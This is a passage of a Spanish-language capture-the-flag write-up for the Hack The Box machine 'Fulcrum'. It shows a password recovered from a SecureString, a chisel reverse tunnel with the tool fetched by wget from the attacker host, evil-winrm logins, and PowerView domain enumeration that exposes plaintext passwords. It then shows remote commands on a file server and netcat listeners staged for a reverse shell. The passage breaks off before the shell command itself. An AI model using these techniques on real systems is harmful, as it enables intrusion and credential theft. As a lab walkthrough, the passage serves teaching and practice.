‚îî‚îÄPS&gt; <span class="nv">$Ptr</span> <span class="o">=</span> <span class="o">[</span>System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode<span class="o">(</span><span class="nv">$4</span><span class="o">)</span>

‚îå‚îÄ‚îÄ<span class="o">(</span>miguel„âømiguelos<span class="o">)</span>-[/home/miguel]
‚îî‚îÄPS&gt; <span class="nv">$4</span>
System.Security.SecureString
</code></pre></div></div>

<ul>
  <li>Y vemos la contrase√±a.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UserName Password
<span class="nt">--------</span> <span class="nt">--------</span>
WebUser  M4ng¬£m¬£ntPa55
</code></pre></div></div>

<ul>
  <li>
    <p>El puerto del servicio de <code class="language-plaintext highlighter-rouge">evil-winrm</code> esta abierto a si que podemos conectarnos con ese usuario y esa contrase√±a pero necesitamos hacer un t√∫nel para poder llegar a esa <code class="language-plaintext highlighter-rouge">IP</code> ya que no tenemos conectividad desde nuestra m√°quina.</p>
  </li>
  <li>
    <p>Haremos Remote Port Forwaring <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content <span class="nb">gunzip </span>chisel_1.9.1_linux_amd64.gz
‚ûú  content <span class="nb">ls
</span>chisel_1.9.1_linux_amd64  creds.txt
‚ûú  content <span class="nb">chmod</span> +x chisel_1.9.1_linux_amd64
</code></pre></div></div>

<ul>
  <li>Vamos a pasarlo a la m√°quina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@fulcrum:/tmp<span class="nv">$ </span>wget http://10.10.14.62:10/chisel_1.9.1_linux_amd64
<span class="nt">--2024-06-14</span> 23:11:47--  http://10.10.14.62:10/chisel_1.9.1_linux_amd64
Connecting to 10.10.14.62:10... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8654848 <span class="o">(</span>8.3M<span class="o">)</span> <span class="o">[</span>application/octet-stream]
Saving to: <span class="s1">'chisel_1.9.1_linux_amd64'</span>

chisel_1.9.1_linux_ 100%[<span class="o">===================&gt;]</span>   8.25M  2.93MB/s    <span class="k">in </span>2.8s

2024-06-14 23:11:50 <span class="o">(</span>2.93 MB/s<span class="o">)</span> - <span class="s1">'chisel_1.9.1_linux_amd64'</span> saved <span class="o">[</span>8654848/8654848]
www-data@fulcrum:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x chisel_1.9.1_linux_amd64
</code></pre></div></div>

<ul>
  <li>Ahora ejecutamos el chisel en nuestra m√°quina para estar en modo servidor.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content ./chisel_1.9.1_linux_amd64 server <span class="nt">--reverse</span> <span class="nt">-p</span> 1234
2024/06/14 17:13:45 server: Reverse tunnelling enabled
2024/06/14 17:13:45 server: Fingerprint <span class="nv">QauEzPD66q6tCwMPbC8G9HA07OU0KldXvnbkZLhVKQQ</span><span class="o">=</span>
2024/06/14 17:13:45 server: Listening on http://0.0.0.0:1234
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos en la m√°quina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel_1.9.1_linux_amd64 client 10.10.14.62:1234 R:5985
2024/06/14 23:15:29 client: Connecting to ws://10.10.14.62:1234
2024/06/14 23:15:30 client: Connected <span class="o">(</span>Latency 112.623194ms<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Recibimos la conexi√≥n.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content ./chisel_1.9.1_linux_amd64 server <span class="nt">--reverse</span> <span class="nt">-p</span> 1234
2024/06/14 17:13:45 server: Reverse tunnelling enabled
2024/06/14 17:13:45 server: Fingerprint <span class="nv">QauEzPD66q6tCwMPbC8G9HA07OU0KldXvnbkZLhVKQQ</span><span class="o">=</span>
2024/06/14 17:13:45 server: Listening on http://0.0.0.0:1234
2024/06/14 17:15:29 server: session#1: tun: proxy#R:5985<span class="o">=&gt;</span>192.168.122.228:5985: Listening
</code></pre></div></div>

<h2 id="shell-as-btables">Shell as btables</h2>

<ul>
  <li>Ahora ya nos podemos conectar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  ~ evil-winrm <span class="nt">-i</span> 127.0.0.1 <span class="nt">-u</span> <span class="s1">'WebUser'</span> <span class="nt">-p</span> <span class="s1">'M4ng¬£m¬£ntPa55'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\W</span>ebUser<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>webserver<span class="se">\w</span>ebuser
</code></pre></div></div>

<ul>
  <li>En la m√°quina victima hay una pagina web y en esta ruta encontramos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">cd </span>C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>         5/8/2022   2:46 AM            703 iisstart.htm
<span class="nt">-a----</span>         5/8/2022   2:46 AM          99710 iisstart.png
<span class="nt">-a----</span>        2/12/2022  11:42 PM           5252 index.htm
<span class="nt">-a----</span>        2/12/2022  11:42 PM           1280 web.config


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot&gt; <span class="nb">type </span>web.config
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
&lt;configuration <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.microsoft.com/.NetConfiguration/v2.0"</span><span class="o">&gt;</span>
    &lt;appSettings /&gt;
    &lt;connectionStrings&gt;
        &lt;add <span class="nv">connectionString</span><span class="o">=</span><span class="s2">"LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"ADServices"</span> /&gt;
    &lt;/connectionStrings&gt;
    &lt;system.web&gt;
        &lt;membership <span class="nv">defaultProvider</span><span class="o">=</span><span class="s2">"ADProvider"</span><span class="o">&gt;</span>
            &lt;providers&gt;
                &lt;add <span class="nv">name</span><span class="o">=</span><span class="s2">"ADProvider"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"System.Web.Security.ActiveDirectoryMembershipProvider, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"</span> <span class="nv">connectionStringName</span><span class="o">=</span><span class="s2">"ADConnString"</span> <span class="nv">connectionUsername</span><span class="o">=</span><span class="s2">"FULCRUM</span><span class="se">\L</span><span class="s2">DAP"</span> <span class="nv">connectionPassword</span><span class="o">=</span><span class="s2">"PasswordForSearching123!"</span> <span class="nv">attributeMapUsername</span><span class="o">=</span><span class="s2">"SAMAccountName"</span> /&gt;
            &lt;/providers&gt;
        &lt;/membership&gt;
    &lt;/system.web&gt;
&lt;system.webServer&gt;
   &lt;httpProtocol&gt;
      &lt;customHeaders&gt;
           &lt;clear /&gt;
      &lt;/customHeaders&gt;
   &lt;/httpProtocol&gt;
        &lt;defaultDocument&gt;
            &lt;files&gt;
                &lt;clear /&gt;
                &lt;add <span class="nv">value</span><span class="o">=</span><span class="s2">"Default.asp"</span> /&gt;
                &lt;add <span class="nv">value</span><span class="o">=</span><span class="s2">"Default.htm"</span> /&gt;
                &lt;add <span class="nv">value</span><span class="o">=</span><span class="s2">"index.htm"</span> /&gt;
                &lt;add <span class="nv">value</span><span class="o">=</span><span class="s2">"index.html"</span> /&gt;
                &lt;add <span class="nv">value</span><span class="o">=</span><span class="s2">"iisstart.htm"</span> /&gt;
            &lt;/files&gt;
        &lt;/defaultDocument&gt;
&lt;/system.webServer&gt;
&lt;/configuration&gt;
</code></pre></div></div>

<ul>
  <li>Ese es el <code class="language-plaintext highlighter-rouge">domain controller</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot&gt; ping dc.fulcrum.local

Pinging dc.fulcrum.local <span class="o">[</span>192.168.122.130] with 32 bytes of data:
Request timed out.
</code></pre></div></div>

<ul>
  <li>Tenemos una credencial a nivel de dominio vamos a enumerar el dominio para eso usaremos el siguiente recurso <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot&gt;  <span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">mkdir </span>Privesc


    Directory: C:<span class="se">\W</span>indows<span class="se">\T</span>emp


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        6/15/2024  12:48 AM                Privesc


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">cd </span>Privesc
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; upload /home/miguel/Hackthebox/Fulcrum/nmap/PowerView.ps1

Info: Uploading /home/miguel/Hackthebox/Fulcrum/nmap/PowerView.ps1 to C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc<span class="se">\P</span>owerView.ps1

Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
</code></pre></div></div>

<ul>
  <li>Vamos a importar el modulo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .<span class="se">\P</span>owerView.ps1
</code></pre></div></div>

<ul>
  <li>Ahora definimos todo como no lo dicen en el script de PowerView.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; <span class="nv">$SecPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'PasswordForSearching123!'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'FULCRUM\LDAP'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos a listar todos los usuario del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Get-DomainUser <span class="nt">-Credential</span> <span class="nv">$Cred</span>


logoncount             : 6
badpasswordtime        : 12/31/1600 4:00:00 PM
description            : Built-in account <span class="k">for </span>administering the computer/domain
distinguishedname      : <span class="nv">CN</span><span class="o">=</span>Administrator,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>objectclass            : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
lastlogontimestamp     : 5/7/2022 11:56:07 PM
name                   : Administrator
objectsid              : S-1-5-21-1158016984-652700382-3033952538-500
samaccountname         : Administrator
logonhours             : <span class="o">{</span>255, 255, 255, 255...<span class="o">}</span>
admincount             : 1
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : 12/31/1600 4:00:00 PM
countrycode            : 0
whenchanged            : 5/8/2022 8:14:22 AM
instancetype           : 4
objectguid             : 73409563-3e6c-4ac9-9bd8-a804c6519ead
lastlogon              : 5/8/2022 1:49:11 AM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>dscorepropagationdata  : <span class="o">{</span>5/8/2022 7:10:32 AM, 5/8/2022 7:10:32 AM, 5/8/2022 6:55:22 AM, 1/1/1601 6:12:16 PM<span class="o">}</span>
memberof               : <span class="o">{</span><span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local</span>, <span class="nv">CN</span><span class="o">=</span>Domain Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local</span>, <span class="nv">CN</span><span class="o">=</span>Enterprise Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local</span>, <span class="nv">CN</span><span class="o">=</span>Schema Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span>local...<span class="o">}</span>
whencreated            : 5/8/2022 6:52:43 AM
iscriticalsystemobject : True
badpwdcount            : 0
cn                     : Administrator
useraccountcontrol     : NORMAL_ACCOUNT
usncreated             : 8196
primarygroupid         : 513
pwdlastset             : 5/8/2022 1:14:22 AM
usnchanged             : 12848

pwdlastset             : 12/31/1600 4:00:00 PM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
description            : Built-in account <span class="k">for </span>guest access to the computer/domain
distinguishedname      : <span class="nv">CN</span><span class="o">=</span>Guest,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>objectclass            : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
name                   : Guest
objectsid              : S-1-5-21-1158016984-652700382-3033952538-501
samaccountname         : Guest
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 5/8/2022 6:52:43 AM
instancetype           : 4
objectguid             : 07e39362-1d6b-4f14-939a-75a5cc85d91d
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>dscorepropagationdata  : <span class="o">{</span>5/8/2022 6:55:22 AM, 1/1/1601 12:00:01 AM<span class="o">}</span>
memberof               : <span class="nv">CN</span><span class="o">=</span>Guests,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>whencreated            : 5/8/2022 6:52:43 AM
badpwdcount            : 0
cn                     : Guest
useraccountcontrol     : ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated             : 8197
primarygroupid         : 514
iscriticalsystemobject : True
usnchanged             : 8197

logoncount                    : 0
badpasswordtime               : 12/31/1600 4:00:00 PM
description                   : Key Distribution Center Service Account
distinguishedname             : <span class="nv">CN</span><span class="o">=</span>krbtgt,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>objectclass                   : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
name                          : krbtgt
primarygroupid                : 513
objectsid                     : S-1-5-21-1158016984-652700382-3033952538-502
samaccountname                : krbtgt
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
showinadvancedviewonly        : True
accountexpires                : NEVER
cn                            : krbtgt
whenchanged                   : 5/8/2022 7:10:32 AM
instancetype                  : 4
objectguid                    : e6e5f620-8510-45f2-9ddc-0b36e43f55fd
lastlogon                     : 12/31/1600 4:00:00 PM
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>dscorepropagationdata         : <span class="o">{</span>5/8/2022 7:10:32 AM, 5/8/2022 6:55:22 AM, 1/1/1601 12:04:16 AM<span class="o">}</span>
serviceprincipalname          : kadmin/changepw
memberof                      : <span class="nv">CN</span><span class="o">=</span>Denied RODC Password Replication Group,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>whencreated                   : 5/8/2022 6:55:21 AM
iscriticalsystemobject        : True
badpwdcount                   : 0
useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
usncreated                    : 12324
countrycode                   : 0
pwdlastset                    : 5/7/2022 11:55:21 PM
msds-supportedencryptiontypes : 0
usnchanged                    : 12831

company               : fulcrum
logoncount            : 1
badpasswordtime       : 12/31/1600 4:00:00 PM
st                    : UN
l                     : unknown
distinguishedname     : <span class="nv">CN</span><span class="o">=</span>ldap,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>objectclass           : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
lastlogontimestamp    : 6/15/2024 12:56:14 AM
name                  : ldap
objectsid             : S-1-5-21-1158016984-652700382-3033952538-1103
samaccountname        : ldap
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 6/15/2024 7:56:14 AM
instancetype          : 4
usncreated            : 12595
objectguid            : cc068896-96ca-4bdd-a6e9-cea49d58c6ec
sn                    : user
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>dscorepropagationdata : 1/1/1601 12:00:00 AM
givenname             : ldap
c                     : UK
lastlogon             : 6/15/2024 12:56:14 AM
streetaddress         : unknown
badpwdcount           : 0
cn                    : ldap
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 5/8/2022 7:02:27 AM
primarygroupid        : 513
pwdlastset            : 5/8/2022 12:02:27 AM
usnchanged            : 24668
postalcode            : 12345

company               : fulcrum
logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
st                    : UN
l                     : unknown
distinguishedname     : <span class="nv">CN</span><span class="o">=</span>923a,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>objectclass           : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
name                  : 923a
objectsid             : S-1-5-21-1158016984-652700382-3033952538-1104
samaccountname        : 923a
admincount            : 1
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/8/2022 7:10:32 AM
instancetype          : 4
usncreated            : 12610
objectguid            : 8ea0a902-110d-46ec-98b4-825d392c687c
sn                    : 923a
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>dscorepropagationdata : <span class="o">{</span>5/8/2022 7:10:32 AM, 1/1/1601 12:00:00 AM<span class="o">}</span>
givenname             : 923a
c                     : UK
memberof              : <span class="nv">CN</span><span class="o">=</span>Domain Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>lastlogon             : 12/31/1600 4:00:00 PM
streetaddress         : unknown
badpwdcount           : 0
cn                    : 923a
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 5/8/2022 7:02:38 AM
primarygroupid        : 513
pwdlastset            : 5/8/2022 12:02:38 AM
usnchanged            : 12813
postalcode            : 12345

company               : fulcrum
logoncount            : 1
badpasswordtime       : 12/31/1600 4:00:00 PM
st                    : UN
l                     : unknown
distinguishedname     : <span class="nv">CN</span><span class="o">=</span>BTables,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>objectclass           : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
lastlogontimestamp    : 5/9/2022 7:48:46 AM
name                  : BTables
objectsid             : S-1-5-21-1158016984-652700382-3033952538-1105
samaccountname        : BTables
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/9/2022 2:48:46 PM
instancetype          : 4
usncreated            : 12628
objectguid            : 8e5db1d3-d28c-4aa1-b49d-f5f8216959fe
sn                    : BTables
info                  : Password <span class="nb">set </span>to ++FileServerLogon12345++
objectcategory        : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>dscorepropagationdata : 1/1/1601 12:00:00 AM
givenname             : BTables
c                     : UK
lastlogon             : 5/9/2022 7:48:46 AM
streetaddress         : unknown
badpwdcount           : 0
cn                    : BTables
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 5/8/2022 7:02:49 AM
primarygroupid        : 513
pwdlastset            : 5/8/2022 12:02:49 AM
usnchanged            : 16404
lastlogoff            : 12/31/1600 4:00:00 PM
postalcode            : 12345
</code></pre></div></div>

<ul>
  <li>Si filtramos directo por la info de los usuarios vemos la contrase√±a del usuario <code class="language-plaintext highlighter-rouge">BTables</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Get-DomainUser <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-DomainController</span> dc.fulcrum.local | Select Name,Info

name          Info
<span class="nt">----</span>          <span class="nt">----</span>
Administrator
Guest
krbtgt
ldap
923a
BTables       Password <span class="nb">set </span>to ++FileServerLogon12345++
</code></pre></div></div>

<ul>
  <li>Este usuario es administrador del dominio si lo pwneamos tendremos privilegios m√°ximos a nivel de dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Get-DomainUser <span class="nt">-Credential</span> <span class="nv">$Cred</span> 923a


company               : fulcrum
logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
st                    : UN
l                     : unknown
distinguishedname     : <span class="nv">CN</span><span class="o">=</span>923a,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>objectclass           : <span class="o">{</span>top, person, organizationalPerson, user<span class="o">}</span>
name                  : 923a
objectsid             : S-1-5-21-1158016984-652700382-3033952538-1104
samaccountname        : 923a
admincount            : 1
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/8/2022 7:10:32 AM
instancetype          : 4
usncreated            : 12610
objectguid            : 8ea0a902-110d-46ec-98b4-825d392c687c
sn                    : 923a
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>dscorepropagationdata : <span class="o">{</span>5/8/2022 7:10:32 AM, 1/1/1601 12:00:00 AM<span class="o">}</span>
givenname             : 923a
c                     : UK
memberof              : <span class="nv">CN</span><span class="o">=</span>Domain Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>fulcrum,DC<span class="o">=</span><span class="nb">local
</span>lastlogon             : 12/31/1600 4:00:00 PM
streetaddress         : unknown
badpwdcount           : 0
cn                    : 923a
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 5/8/2022 7:02:38 AM
primarygroupid        : 513
pwdlastset            : 5/8/2022 12:02:38 AM
usnchanged            : 12813
postalcode            : 12345
</code></pre></div></div>

<ul>
  <li>Vemos que solo hay 2 equipos mas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Get-DomainComputer <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-DomainController</span> dc.fulcrum.local | Select DNSHostname

dnshostname
<span class="nt">-----------</span>
DC.fulcrum.local
FILE.fulcrum.local
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">Invoke-Command</code> para ejecutar comandos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; <span class="nv">$SecPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'++FileServerLogon12345++'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'fulcrum.local\BTables'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Podemos ejecutar comandos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Invoke-Command <span class="nt">-ComputerName</span> file.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> <span class="nb">whoami</span> <span class="o">}</span>
fulcrum<span class="se">\b</span>tables
</code></pre></div></div>

<ul>
  <li>Podemos ver si tenemos conectividad con el puerto <strong>53</strong> <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/test-connection?view=powershell-7.4">https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/test-connection?view=powershell-7.4</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Invoke-Command <span class="nt">-ComputerName</span> file.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> Test-NetConnection <span class="nt">-ComputerName</span> 10.10.14.62 <span class="nt">-Port</span> 53 <span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Y bueno recibimos la conexi√≥n.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  ~ nc <span class="nt">-nlvp</span> 53
listening on <span class="o">[</span>any] 53 ...
connect to <span class="o">[</span>10.10.14.62] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.62] 49737
</code></pre></div></div>

<ul>
  <li>
    <p>Podemos mandarnos una reverse shell <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1</a>.</p>
  </li>
  <li>
    <p>Nos ponemos en escucha.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  ~ rlwrap nc <span class="nt">-nlvp</span> 53
listening on <span class="o">[</span>any] 53 ...
</code></pre></div></div>

<ul>
  <li>Y enviamos la reverse shell.</li>
</ul>

